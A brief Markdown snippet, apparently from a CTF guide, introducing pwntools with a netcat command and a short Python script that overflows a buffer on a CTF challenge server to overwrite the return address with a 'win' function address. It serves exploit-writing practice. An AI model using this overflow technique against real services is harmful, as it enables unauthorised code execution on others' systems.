## Pwntools
A grab-bag of tools to make writing exploits for CTFs easy!


```
nc pwn.hsctf.com 1234
```
```python
from pwn import * 
p = remote('pwn.hsctf.com', 1234)
buf = 'A'*20
win = p32(0x080491b6)
payload = buf + win
p.sendline(payload)
p.interactive()
```
